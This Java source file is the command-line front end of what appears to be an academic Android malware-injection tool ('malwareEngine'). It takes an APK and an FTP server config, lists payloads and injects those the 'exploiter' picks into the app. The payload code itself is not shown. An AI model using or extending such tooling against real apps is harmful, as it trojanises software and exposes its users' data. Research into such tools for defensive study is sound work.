package it.unisannio.srss.dame.cli;

import it.unisannio.srss.dame.android.payloads.Payload;

import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.Scanner;
import java.util.StringTokenizer;

import org.kohsuke.args4j.Argument;
import org.kohsuke.args4j.CmdLineException;
import org.kohsuke.args4j.CmdLineParser;
import org.kohsuke.args4j.Option;

public class Main {

	@Option(name = "-o", usage = "apk file dest path")
	private String apkOut = null;

	@Option(name = "-config", usage = "ftp server file config", required = true)
	private File config = null;

	@Argument(required = true, usage = "apk file source")
	File apk = new File(".");

	public static void main(String[] args) throws IOException {
		new Main().doMain(args);
	}

	public void doMain(String[] args) throws IOException {
		CmdLineParser parser = new CmdLineParser(this);
		try {
			// parse the arguments.
			parser.parseArgument(args);
			Dame dame = new Dame();
			String apkIn = apk.getAbsolutePath();
			dame.setApkIn(apkIn);
			if (apkOut != null) {
				dame.setApkOut(apkOut);
			}
			String serverConfigPath = config.getAbsolutePath();
			dame.setServerConfigPath(serverConfigPath);
			List<Payload> payloads=dame.getFilteredPayloadList();
			if(!payloads.isEmpty()){
				System.out.println("Available payloads list. Insert payload's index for injection.\nYou can also specify more than one payload, splited by comma.");
				int i=0;
				for (Payload payload : payloads) {
					System.out.println(i+" - "+payload.toString());
					i++;
				}
				Scanner scanner=new Scanner(System.in);
				String fromExploiter=scanner.nextLine()+",";
				scanner.close();
				StringTokenizer st=new StringTokenizer(fromExploiter,",");
				
				List<Payload> toInject=new ArrayList<Payload>();
				while(st.hasMoreTokens()){
					toInject.add(payloads.get(Integer.parseInt(st.nextToken())));
				}
				dame.inject(toInject);
			}else{
				System.out.println("Not available payloads for your apk!");
			}
		} catch (CmdLineException e) {
			// if there's a problem in the command line,
			// you'll get this exception. this will report
			// an error message.
			System.err.println(e.getMessage());
			System.err.println("java malwareEngine [options...] FILE.apk");
			// print the list of available options
			parser.printUsage(System.err);
			System.err.println();
			// print option sample. This is useful some time
			// System.err.println(" Example: java SampleMain"+parser.printExample());
			return;
		}
	}
}
